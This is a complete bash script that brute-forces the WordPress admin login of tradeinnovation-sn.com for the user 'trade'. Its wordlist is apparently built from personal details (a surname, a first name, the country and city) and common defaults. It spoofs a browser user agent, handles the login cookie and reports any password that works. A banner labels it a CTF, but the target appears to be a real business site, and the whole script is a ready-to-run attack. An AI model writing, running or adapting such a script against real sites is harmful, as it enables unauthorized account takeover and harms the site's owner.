#!/bin/bash

PASSWORDS=(
  "cisco" "Cisco" "Cisko" "C1sko" "c1sko" "C1sk0" "c1sk0"
  "trade" "Trade" "Trade123" "trade123" "Trade@123"
  "tradeinnovation" "TradeInnovation" "trade_innovation"
  "innovation" "Innovation" "Innovation123"
  "cissokho" "Cissokho" "cissokho123"
  "admin" "Admin" "Admin123" "admin123"
  "senegal" "Senegal" "dakar" "Dakar"
  "password" "Password" "Password123" "pass123"
  "cisco123" "Cisco123" "cisko123" "Cisko123"
  "123456" "12345678" "qwerty"
  "trade2024" "trade2025" "trade2026"
  "TradeInn" "tradeinn"
  "cissokho2024" "moustapha" "Moustapha"
  "sn2024" "sn2025" "Trade@sn"
)

TARGET="https://tradeinnovation-sn.com/wp-login.php"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
COOKIE_JAR="/tmp/wp_cookies.txt"

echo ""
echo "╔══════════════════════════════════════════════╗"
echo "║   WordPress CTF - Brute Force ciblé          ║"
echo "║   Target: tradeinnovation-sn.com             ║"
echo "║   User:   trade                              ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "[*] Test de ${#PASSWORDS[@]} mots de passe..."
echo "──────────────────────────────────────────────"

for pwd in "${PASSWORDS[@]}"; do
  rm -f "$COOKIE_JAR"

  # Étape 1 : GET pour obtenir le cookie de test WordPress
  curl -s -c "$COOKIE_JAR" \
    -H "User-Agent: $UA" \
    "$TARGET" > /dev/null

  # Étape 2 : POST avec les credentials
  RESPONSE=$(curl -s -X POST "$TARGET" \
    -d "log=trade&pwd=${pwd}&wp-submit=Se+connecter&redirect_to=%2Fwp-admin%2F&testcookie=1" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "User-Agent: $UA" \
    -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -L 2>/dev/null)

  # Détection du succès (connecté au dashboard)
  if echo "$RESPONSE" | grep -qiE "wp-admin-bar|Tableau de bord|Dashboard|wp-admin|logout|Déconnexion|howdy"; then
    echo ""
    echo "╔══════════════════════════════════════════════╗"
    echo "║  ✅  PASSWORD TROUVÉ !                       ║"
    echo "║  🔑  trade : $pwd"
    echo "╚══════════════════════════════════════════════╝"
    echo ""
    exit 0
  # Détection de l'échec explicite WordPress
  elif echo "$RESPONSE" | grep -qiE "login_error|ne correspond pas|incorrect|wrong password"; then
    echo "[-] ÉCHEC   → '$pwd'"
  else
    echo "[?] INCONNU → '$pwd' (réponse inattendue)"
  fi

  sleep 0.4
done

echo ""
echo "──────────────────────────────────────────────"
echo "[!] Mot de passe non trouvé dans cette liste."
echo "[*] Conseil : ajoute d'autres mots de passe dans la liste PASSWORDS"
